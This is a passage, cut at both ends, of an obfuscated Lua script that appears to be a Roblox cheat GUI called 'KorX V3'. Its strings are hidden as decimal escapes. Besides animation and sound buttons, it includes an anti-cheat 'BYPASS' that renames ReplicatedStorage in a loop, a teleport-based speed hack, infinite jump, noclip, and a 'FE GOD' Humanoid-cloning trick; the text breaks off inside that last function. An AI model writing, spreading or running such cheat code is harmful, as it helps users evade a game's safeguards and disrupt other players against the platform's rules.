Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\83\112\105\110\110\105\110\103\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
farcgpm_oi.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(farcgpm_oi)
while wait(0.3) do
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end
end)
AnimationId2 = "\50\56\50\53\55\52\52\52\48"
local _oiklqdtenb = Instance.new("\65\110\105\109\97\116\105\111\110")
sfar.Name = "\67\82\65\87\76"
sfar.Parent = klq
sfar.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
sfar.BackgroundTransparency = 0.30000001192093
sfar.Position = UDim2.new(0.047786735, 0, 0.900596499, 0)
sfar.Size = UDim2.new(0, 160, 0, 40)
sfar.Font = Enum.Font.Garamond
sfar.Text = "\67\82\65\87\76"
sfar.TextColor3 = Color3.new(0, 0, 0)
sfar.TextSize = 14
sfar.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\67\114\97\119\108\105\110\103\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
_oiklqdtenb.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId2
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(_oiklqdtenb)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
jsfar.Name = "\65\110\105\109\97\116\105\111\110\115\50\32\77\101\110\117"
jsfar.Parent = arc
jsfar.BackgroundColor3 = Color3.new(1, 1, 1)
jsfar.BackgroundTransparency = 0.60000002384186
jsfar.Position = UDim2.new(0.797352314, 0, 0.0400000103, 0)
jsfar.Size = UDim2.new(0, 176, 0, 503)
bjsfa.Name = "\65\110\105\109\97\116\105\111\110\115\50\32\84\105\116\108\101"
bjsfa.Parent = jsfar
bjsfa.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
bjsfa.BackgroundTransparency = 0.5
bjsfa.Position = UDim2.new(0.047786735, 0, 0.0304589141, 0)
bjsfa.Size = UDim2.new(0, 160, 0, 34)
nbjs.Parent = bjsfa
nbjs.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
nbjs.BackgroundTransparency = 0.5
nbjs.Size = UDim2.new(0, 160, 0, 34)
nbjs.Font = Enum.Font.Garamond
nbjs.Text = "\91\65\110\105\109\97\116\105\111\110\115\32\50\93"
nbjs.TextColor3 = Color3.new(0, 0, 0)
nbjs.TextScaled = true
nbjs.TextSize = 14
nbjs.TextWrapped = true
enbjs.Name = "\66\65\82\82\69\76\82\79\76\76"
enbjs.Parent = jsfar
enbjs.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
enbjs.BackgroundTransparency = 0.30000001192093
enbjs.Position = UDim2.new(0.047786735, 0, 0.131212831, 0)
enbjs.Size = UDim2.new(0, 160, 0, 40)
enbjs.Font = Enum.Font.Garamond
enbjs.Text = "\66\65\82\82\69\76\32\82\79\76\76"
enbjs.TextColor3 = Color3.new(0, 0, 0)
enbjs.TextSize = 14
enbjs.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId4 = "\49\51\54\56\48\49\57\54\52"
local cgpm_oikl = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\97\114\114\101\108\32\82\111\108\108\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
cgpm_oikl.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId4
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(cgpm_oikl)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
tenb.Name = "\83\67\82\69\65\77"
tenb.Parent = jsfar
tenb.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
tenb.BackgroundTransparency = 0.30000001192093
tenb.Position = UDim2.new(0.047786735, 0, 0.224652186, 0)
tenb.Size = UDim2.new(0, 160, 0, 40)
tenb.Font = Enum.Font.Garamond
tenb.Text = "\83\67\82\69\65\77"
tenb.TextColor3 = Color3.new(0, 0, 0)
tenb.TextSize = 14
tenb.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId5 = "\49\56\48\54\49\49\56\55\48"
local farcgpm_o = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\83\99\114\101\97\109\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
farcgpm_o.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId5
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(farcgpm_o)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
dten.Name = "\70\65\73\78\84"
dten.Parent = jsfar
dten.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
dten.BackgroundTransparency = 0.30000001192093
dten.Position = UDim2.new(0.047786735, 0, 0.318091542, 0)
dten.Size = UDim2.new(0, 160, 0, 40)
dten.Font = Enum.Font.Garamond
dten.Text = "\70\65\73\78\84"
dten.TextColor3 = Color3.new(0, 0, 0)
dten.TextSize = 14
dten.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId6 = "\49\56\49\53\50\53\53\52\54"
local b = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\70\97\105\110\116\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
b.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId6
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(b)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
qdte.Name = "\66\79\87\68\79\87\78"
qdte.Parent = jsfar
qdte.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
qdte.BackgroundTransparency = 0.30000001192093
qdte.Position = UDim2.new(0.047786735, 0, 0.413518965, 0)
qdte.Size = UDim2.new(0, 160, 0, 40)
qdte.Font = Enum.Font.Garamond
qdte.Text = "\66\79\87\68\79\87\78"
qdte.TextColor3 = Color3.new(0, 0, 0)
qdte.TextSize = 14
qdte.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId7 = "\50\48\52\50\57\50\51\48\51"
local tenbjsfa = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\111\119\32\68\111\119\110\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
tenbjsfa.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId7
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(tenbjsfa)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
lqdt.Name = "\87\69\73\82\68\68\65\78\67\69"
lqdt.Parent = jsfar
lqdt.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
lqdt.BackgroundTransparency = 0.30000001192093
lqdt.Position = UDim2.new(0.047786735, 0, 0.510934472, 0)
lqdt.Size = UDim2.new(0, 160, 0, 40)
lqdt.Font = Enum.Font.Garamond
lqdt.Text = "\87\69\73\82\68\32\68\65\78\67\69"
lqdt.TextColor3 = Color3.new(0, 0, 0)
lqdt.TextSize = 14
lqdt.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId8 = "\52\53\56\51\52\57\50\52"
local lqdtenbj = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\87\101\105\114\100\32\68\97\110\99\101\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
lqdtenbj.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId8
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(lqdtenbj)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
klqd.Name = "\83\65\68"
klqd.Parent = jsfar
klqd.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
klqd.BackgroundTransparency = 0.30000001192093
klqd.Position = UDim2.new(0.047786735, 0, 0.606361926, 0)
klqd.Size = UDim2.new(0, 160, 0, 40)
klqd.Font = Enum.Font.Garamond
klqd.Text = "\83\65\68"
klqd.TextColor3 = Color3.new(0, 0, 0)
klqd.TextSize = 14
klqd.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationIdb = "\49\56\48\54\49\50\52\54\53"
local oiklqdten = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\83\97\100\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
oiklqdten.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationIdb
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(oiklqdten)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
iklq.Name = "\83\80\73\78\68\65\78\67\69"
iklq.Parent = jsfar
iklq.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
iklq.BackgroundTransparency = 0.30000001192093
iklq.Position = UDim2.new(0.047786735, 0, 0.701789379, 0)
iklq.Size = UDim2.new(0, 160, 0, 40)
iklq.Font = Enum.Font.Garamond
iklq.Text = "\83\80\73\78\32\68\65\78\67\69"
iklq.TextColor3 = Color3.new(0, 0, 0)
iklq.TextSize = 14
iklq.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId10 = "\52\50\57\55\51\48\52\51\48"
local pm_oiklqd = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\83\112\105\110\32\68\97\110\99\101\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
pm_oiklqd.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId10
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(pm_oiklqd)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
oiklq.Name = "\67\82\65\90\89"
oiklq.Parent = jsfar
oiklq.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
oiklq.BackgroundTransparency = 0.30000001192093
oiklq.Position = UDim2.new(0.047786735, 0, 0.801192939, 0)
oiklq.Size = UDim2.new(0, 160, 0, 40)
oiklq.Font = Enum.Font.Garamond
oiklq.Text = "\67\82\65\90\89"
oiklq.TextColor3 = Color3.new(0, 0, 0)
oiklq.TextSize = 14
oiklq.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId11 = "\51\51\55\57\54\48\53\57"
local rcgpm_oi = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\99\82\97\90\121\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
rcgpm_oi.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId11
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(rcgpm_oi)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(25)
end)
AnimationId = "\49\56\56\54\51\50\48\49\49"
local farcgpm_oi = Instance.new("\65\110\105\109\97\116\105\111\110")
farcg.MouseButton2Click:connect(function()
farcgpm_oi.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(farcgpm_oi)
while wait(0) do
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(11)
end
end)
_oikl.Name = "\65\78\78\79\89\73\78\71\68\68\65\78\67\69"
_oikl.Parent = jsfar
_oikl.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
_oikl.BackgroundTransparency = 0.30000001192093
_oikl.Position = UDim2.new(0.047786735, 0, 0.898608446, 0)
_oikl.Size = UDim2.new(0, 160, 0, 40)
_oikl.Font = Enum.Font.Garamond
_oikl.Text = "\65\78\78\79\89\73\78\71\32\68\65\78\67\69"
_oikl.TextColor3 = Color3.new(0, 0, 0)
_oikl.TextSize = 14
_oikl.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
AnimationId12 = "\51\51\55\57\54\48\53\57"
local bjsfarcg = Instance.new("\65\110\105\109\97\116\105\111\110")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\99\82\97\90\121\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
bjsfarcg.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId12
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(bjsfarcg)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(2)
end)
m_oikl.Name = "\70\117\110\47\66\121\112\97\115\115\32\77\101\110\117"
m_oikl.Parent = arc
m_oikl.BackgroundColor3 = Color3.new(1, 1, 1)
m_oikl.BackgroundTransparency = 0.60000002384186
m_oikl.Position = UDim2.new(0.0224032588, 0, 0.0400000103, 0)
m_oikl.Size = UDim2.new(0, 177, 0, 503)
pm_oik.Name = "\66\89\80\65\83\83"
pm_oik.Parent = m_oikl
pm_oik.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
pm_oik.BackgroundTransparency = 0.30000001192093
pm_oik.Position = UDim2.new(0.047786735, 0, 0.133200794, 0)
pm_oik.Size = UDim2.new(0, 160, 0, 40)
pm_oik.Font = Enum.Font.Garamond
pm_oik.Text = "\42\42\66\89\80\65\83\83\42\42"
pm_oik.TextColor3 = Color3.new(1, 0, 0)
pm_oik.TextScaled = true
pm_oik.TextSize = 14
pm_oik.TextWrapped = true
pm_oik.MouseButton1Down:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\66\121\112\97\115\115\32\115\117\99\99\101\115\115\102\117\108\33";
})
game.Players.LocalPlayer.Character:BreakJoints()
while true do
game.ReplicatedStorage.Name = "\82\101\112\83\116\111\114\97\103\101"
wait(0.5)
end
end)
gpm_oi.Name = "\83\80\69\69\68"
gpm_oi.Parent = m_oikl
gpm_oi.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
gpm_oi.BackgroundTransparency = 0.30000001192093
gpm_oi.Position = UDim2.new(0.047786735, 0, 0.226640165, 0)
gpm_oi.Size = UDim2.new(0, 160, 0, 40)
gpm_oi.Font = Enum.Font.Garamond
gpm_oi.Text = "\83\80\69\69\68"
gpm_oi.TextColor3 = Color3.new(1, 0, 0)
gpm_oi.TextSize = 14
gpm_oi.MouseButton1Down:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\83\112\101\101\100\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46\32\72\111\108\100\32\115\104\105\102\116\32\116\111\32\114\117\110\33";
})
local _oiklqdtenbj = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
local oiklqdtenb = _oiklqdtenbj.Character
local klqdtenbjs = game:GetService("\80\108\97\121\101\114\115").LocalPlayer:GetMouse()
local m_oiklqdten = oiklqdtenb:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
local _oiklqdtenbj = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
local oiklqdtenb = _oiklqdtenbj.Character
local klqdtenbjs = game:GetService("\80\108\97\121\101\114\115").LocalPlayer:GetMouse()
local m_oiklqdten = oiklqdtenb:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_)
    if m_oiklqdtenb_ == "\48" then
        loop = true
        while loop do
            m_oiklqdten.CFrame = m_oiklqdten.CFrame + m_oiklqdten.CFrame.lookVector * 3
            wait()
        end
        end
        end)
klqdtenbjs.KeyUp:connect(function(m_oiklqdtenb_)
    if m_oiklqdtenb_ == "\48" then
        loop = false
    end
end)
end)
cgpm_o.Name = "\73\78\70\74\85\77\80"
cgpm_o.Parent = m_oikl
cgpm_o.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
cgpm_o.BackgroundTransparency = 0.30000001192093
cgpm_o.Position = UDim2.new(0.047786735, 0, 0.322067589, 0)
cgpm_o.Size = UDim2.new(0, 160, 0, 40)
cgpm_o.Font = Enum.Font.Garamond
cgpm_o.Text = "\73\78\70\73\78\73\84\69\32\74\85\77\80"
cgpm_o.TextColor3 = Color3.new(0, 0, 0)
cgpm_o.TextSize = 14
cgpm_o.MouseButton1Down:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\73\110\102\105\110\105\116\101\32\106\117\109\112\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
local gpm_oikl = true
game:GetService("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101").JumpRequest:connect(function()
    if gpm_oikl then
        game:GetService"\80\108\97\121\101\114\115".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("\74\117\109\112\105\110\103")
    end
end)
end)
rcgpm_.Name = "\78\79\67\76\73\80"
rcgpm_.Parent = m_oikl
rcgpm_.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
rcgpm_.BackgroundTransparency = 0.30000001192093
rcgpm_.Position = UDim2.new(0.047786735, 0, 0.417495042, 0)
rcgpm_.Size = UDim2.new(0, 160, 0, 40)
rcgpm_.Font = Enum.Font.Garamond
rcgpm_.Text = "\78\79\45\67\76\73\80"
rcgpm_.TextColor3 = Color3.new(1, 0, 0)
rcgpm_.TextSize = 14
rcgpm_.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\78\111\45\67\108\105\112\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\59\32\112\114\101\115\115\32\39\110\39\32\116\111\32\116\111\103\103\108\101\46";
})
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
_oiklqdtenbj = game.Players.LocalPlayer
klqdtenbjs = _oiklqdtenbj:GetMouse()
klqdtenbjs.KeyDown:connect(function(m_oiklqdtenb_)
if m_oiklqdtenb_ == "\110" then
noclip = not noclip
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
end)
arcgpm.Name = "\70\69\71\79\68"
arcgpm.Parent = m_oikl
arcgpm.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
arcgpm.BackgroundTransparency = 0.30000001192093
arcgpm.Position = UDim2.new(0.047786735, 0, 0.512922466, 0)
arcgpm.Size = UDim2.new(0, 160, 0, 40)
arcgpm.Font = Enum.Font.Garamond
arcgpm.Text = "\70\69\32\71\79\68"
arcgpm.TextColor3 = Color3.new(0, 0, 0)
arcgpm.TextSize = 14
arcgpm.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\70\101\32\71\79\68\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46\32\84\111\32\114\101\115\112\97\119\110\44\32\117\115\101\32\116\104\101\32\82\69\83\80\65\87\78\32\98\117\116\116\111\110\32\112\114\111\118\105\118\101\100\32\105\110\32\116\104\101\32\71\85\73\46";
})
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local arcgpm_oi = game.Players.LocalPlayer.Character["\49"]:Clone()
arcgpm_oi.Parent = game.Players.LocalPlayer.Character
arcgpm_oi.Name = "\72\117\109\97\110\111\105\100"
wait(0.1)
